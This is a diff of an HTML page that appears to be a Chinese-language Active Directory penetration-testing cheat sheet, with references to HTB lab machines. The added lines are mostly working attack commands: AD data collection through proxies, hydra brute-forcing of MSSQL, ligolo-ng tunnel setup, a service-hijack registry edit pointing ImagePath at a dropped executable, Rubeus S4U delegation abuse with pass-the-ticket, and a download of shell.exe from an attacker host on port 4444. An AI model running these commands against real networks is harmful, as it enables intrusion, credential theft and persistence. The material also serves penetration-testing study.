@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
-    <head><meta charset='utf-8'>
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
 <title>血缇之书</title>
 
-<link rel='canonical' href='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
+<link rel='canonical' href='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 
 <link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="血缇之书">
 <meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
-<meta property='og:url' content='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
+<meta property='og:url' content='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-10-11T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-10-11T19:40:56&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-10-31T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-10-31T19:40:56&#43;08:00'/>
 <meta name="twitter:title" content="血缇之书">
 <meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
     </head>
@@ -344,7 +344,8 @@
     </li>
     <li><a href="#tun流量虚拟网卡适合一级内网">tun流量虚拟网卡（适合一级内网）</a>
       <ul>
-        <li><a href="#ligolo-ng虚拟网卡">ligolo-ng虚拟网卡</a></li>
+        <li><a href="#ligolo-ng虚拟网卡反向">ligolo-ng虚拟网卡(反向)</a></li>
+        <li><a href="#ligolo-ng虚拟网卡正向">ligolo-ng虚拟网卡(正向)</a></li>
         <li><a href="#msf动态路由">msf动态路由</a></li>
       </ul>
     </li>
@@ -667,7 +668,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Oct 11, 2025</time>
+                <time class="article-time--published">Oct 31, 2025</time>
             </div>
         
 
@@ -830,8 +831,28 @@
 </span></span><span style="display:flex;"><span>rusthound -d $domain -u $user@$domain -p $pass -f $FQDN -k -i $ip --fqdn-resolver --adcs -z -o ./ 
 </span></span></code></pre></div><p>ldap被禁用的情况下能使用ldaps加密连接</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>rusthound -d $domain -u $user1@$domain -p $pass1 -f $FQDN -i $ip --fqdn-resolver --adcs -z -o ./ --ldapport <span style="color:#ae81ff">636</span>
+</span></span></code></pre></div><p>dns服务不正常（透过代理抓取）处理办法:</p>
+<p>生成krb5.conf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip --generate-krb5-file krb5.conf
+</span></span></code></pre></div><p>删除原conf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo rm /etc/krb5.conf
+</span></span></code></pre></div><p>替换</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo mv krb5.conf /etc/krb5.conf
+</span></span></code></pre></div><p>之后抓取</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>proxychains4 rusthound -i <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span>  -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">@</span>$domain<span style="color:#e6db74">&#34;</span> -k  -o ./ -z --ldaps -f <span style="color:#e6db74">&#34;</span>$dc<span style="color:#e6db74">&#34;</span>
 </span></span></code></pre></div><h4 id="bloodhound-python">bloodhound-python
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodhound-python -d $domain -c ALL -u $user -p $pass -ns $ip --zip
+</span></span></code></pre></div><p>dns服务不正常（透过代理抓取）处理办法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e"># 先将dc写入hosts</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 之后利用dnsmasq将本地充当dns服务器进行本地解析</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 如果没有需要下载一个</span>
+</span></span><span style="display:flex;"><span>sudo apt-get install dnsmasq
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 将/etc/dnsmasq.conf内容写入如下内容</span>
+</span></span><span style="display:flex;"><span>address/DC01.domain.com/10.10.10.10
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 之后重启dnsmasq服务</span>
+</span></span><span style="display:flex;"><span>sudo systemctl restart dnsmasq
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 指定ns为自身正常抓取</span>
+</span></span><span style="display:flex;"><span>bloodhound-python -d $domain -c ALL -u $user -p $pass -ns 127.0.0.1 -dc $host --zip
 </span></span></code></pre></div><h3 id="ldap查询包含匿名ldap">ldap查询(包含匿名ldap)
 </h3><h4 id="ldapdomaindump抓取所有ldap信息生成可视化图表">ldapdomaindump抓取所有ldap信息生成可视化图表
 </h4><p>用户凭证</p>
@@ -1005,6 +1026,8 @@ powerview</p>
 </span></span></code></pre></div><p>winrm密码喷洒
 nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --continue-on-success
+</span></span></code></pre></div><p>mssql爆破 （九头蛇</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>hydra $ip mssql -L ./user.txt -P ./pass.txt
 </span></span></code></pre></div><h3 id="dc存活用户枚举">dc存活用户枚举
 </h3><h4 id="kerbrute爆破">kerbrute爆破
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>kerbrute userenum --dc $ip -d $domain /opt/user.txt
@@ -1662,7 +1685,7 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>wg-socks <span style="color:#75715e"># 查看存活代理id</span>
 </span></span><span style="display:flex;"><span>wg-socks stop <span style="color:#f92672">[</span>id<span style="color:#f92672">]</span>
 </span></span></code></pre></div><h2 id="tun流量虚拟网卡适合一级内网">tun流量虚拟网卡（适合一级内网）
-</h2><h3 id="ligolo-ng虚拟网卡">ligolo-ng虚拟网卡
+</h2><h3 id="ligolo-ng虚拟网卡反向">ligolo-ng虚拟网卡(反向)
 </h3><p>如果只是想通过边界入侵一层内网，ligolo是最好的选择，我们可以抛弃繁杂的proxychains</p>
 <p>ligolo的原理是搭建一条tun隧道，也就是建立一条虚拟网卡并指向指定路由，这种原理导致其十分稳定且好用，并且其只需要一个服务端就可以做到多个客户端连接并且切换使用路由的操作</p>
 <p>前置操作-攻击机(kali)执行-创建虚拟网卡</p>
@@ -1684,7 +1707,13 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>先链接新的客户端，或者当前客户端，之后直接添加新路由即可
 </span></span><span style="display:flex;"><span>sudo ip route add 10.0.56.0/24 dev ligolo 
 </span></span><span style="display:flex;"><span>不要删除原有的10.0.52.0路由，两者共存才能同时访问两个网段
-</span></span></code></pre></div><h3 id="msf动态路由">msf动态路由
+</span></span></code></pre></div><h3 id="ligolo-ng虚拟网卡正向">ligolo-ng虚拟网卡(正向)
+</h3><p>其余设置与反向一致，只是连接以agent充当服务器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./agent -bind 0.0.0.0:9001
+</span></span></code></pre></div><p>先进入ligolo，之后本地主动连接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ligolo-ng » connect_agent --ip $入口机:9001
+</span></span></code></pre></div><p>之后start即可</p>
+<h3 id="msf动态路由">msf动态路由
 </h3><p>msf的动态路由相当于一个专属于它自己的代理，当我们获取一个目标的msf载荷之后，可以直接配置动态路由来进行msf方便的内网入侵</p>
 <p>这里我模拟我们搞到了一台内网session 1,其内网网段模拟为169.254.12.1,执行以下命令</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>use post/multi/manage/autoroute
@@ -1784,6 +1813,9 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -ep bypass -c <span style="color:#e6db74">&#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck&#34;</span>
 </span></span></code></pre></div><p>所有检查 + 所有报告</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -ep bypass -c <span style="color:#e6db74">&#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_</span>$($env:COMPUTERNAME)<span style="color:#e6db74"> -Format TXT,HTML,CSV,XML&#34;</span>
+</span></span></code></pre></div><h4 id="notes">notes
+</h4><p>服务劫持注册表写法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>reg add HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\S</span>ervices<span style="color:#ae81ff">\g</span>update /v ImagePath /t REG_EXPAND_SZ /d  <span style="color:#e6db74">&#34;C:\ProgramData\sb.exe&#34;</span>
 </span></span></code></pre></div><h2 id="bypassuac">bypassUAC
 </h2><h3 id="gui下绕过uac">GUI下绕过uac
 </h3><p>当然，一般情况使用右键管理员运行即可，如果我们只有cmd或者powershell情况或者在kiosk情况下，可以利用powershell运行如下命令</p>
@@ -2673,7 +2705,7 @@ nxc</p>
 </h2><h3 id="无约束">无约束
 </h3><h4 id="rubeus">rubeus
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>dir \\cdc01\pipe\spoolss
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\Rubeus.exe monitor /interval<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5</span> /filteruser<span style="color:#960050;background-color:#1e0010">:</span>CDC01$
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe monitor /interval<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1</span> /nowrap /targetuser<span style="color:#960050;background-color:#1e0010">:</span>CDC01$
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\SpoolSample.exe CDC01 APPSRV01
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>doIFIjCCBR.......
 </span></span></code></pre></div><h4 id="nxc加krbrelayx">nxc加krbrelayx
@@ -2691,18 +2723,20 @@ nxc</p>
 </h3><h4 id="可转发情况">可转发情况
 </h4><h5 id="rubeus-1">rubeus
 </h5><p>为可以约束委派的用户请求tgt</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe asktgt /user:$user /password:$pass /domain:$domain /outfile:ticket.kirbi
+<p>密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe asktgt /user:$user /password:$pass /domain:$domain /nowrap
+</span></span></code></pre></div><p>hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe asktgt /user:$user /rc4:$hash /domain:$domain /nowrap
 </span></span></code></pre></div><p>利用这个票据去请求管理员或者dc机器用户的票据并注入内存</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe s4u /ticket:ticket.kirbi /msdsspn:cifs/dc.painters.htb /impersonateuser:DC$ /domain:painters.htb /altservice:CIFS,HOST,LDAP /ptt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe s4u /ticket:$ticket /msdsspn:cifs/dc.$domain /impersonateuser:$target_or_admin /domain:$domain /ptt
 </span></span><span style="display:flex;"><span><span style="color:#75715e">##解释</span>
 </span></span><span style="display:flex;"><span>s4u	使用 S4U（Service <span style="color:#66d9ef">for</span> User）攻击模块，结合 S4U2Self + S4U2Proxy
 </span></span><span style="display:flex;"><span>/ticket:ticket.kirbi	提供用于身份的 TGT 票据（由约束委派用户如 blake 获取）
 </span></span><span style="display:flex;"><span>/msdsspn:cifs/dc.painters.htb	指定委派目标服务的 SPN，也就是该服务已被允许约束委派
 </span></span><span style="display:flex;"><span>/impersonateuser:DC$	想要伪造的用户账户（此处是域控的计算机账户）
 </span></span><span style="display:flex;"><span>/domain:painters.htb	目标域名
-</span></span><span style="display:flex;"><span>/altservice:CIFS,HOST,LDAP	生成的 TGS 可用于多个服务（即 SPN 列表），常见于访问共享、远程登录、LDAP等
 </span></span><span style="display:flex;"><span>/ptt	“Pass The Ticket” —— 直接将生成的 TGS 注入当前会话中（无需再导出使用）
-</span></span></code></pre></div><p>搞定管理员或者dc后直接打dcsync即可</p>
+</span></span></code></pre></div><p>搞定管理员或者dc后直接打dcsync即可,或者直接psexec</p>
 <h5 id="impacket">impacket
 </h5><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-getTGT $domain/$user -hashes $hash -dc-ip $ip
 </span></span><span style="display:flex;"><span>or
@@ -3858,7 +3892,7 @@ linux换行</p>
 </span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//你的IP/文件路径 保存路径
 </span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.168</span>.174.<span style="color:#ae81ff">3</span>/<span style="color:#ae81ff">1</span>.exe C:\windows\tasks\<span style="color:#ae81ff">1</span>.exe
 </span></span><span style="display:flex;"><span>powershell
-</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4444</span>/shell.exe -OutFile <span style="color:#e6db74">&#34;C:\users\sqlsvc\Documents&#34;</span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4444</span>/shell.exe -OutFile <span style="color:#e6db74">&#34;C:\users\sqlsvc\Documents\shell.exe&#34;</span>
 </span></span><span style="display:flex;"><span>或者
 </span></span><span style="display:flex;"><span>(New-Object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#39;http://10.10.16.23:4444/shell.exe&#39;</span>, <span style="color:#e6db74">&#39;C:\users\sqlsvc\Documents\shell.exe&#39;</span>)
 </span></span></code></pre></div><h3 id="通用反向上传脚本uploadspy">通用反向上传脚本（uploads.py）
@@ -4300,7 +4334,7 @@ linux换行</p>
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                 
                 >
-            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
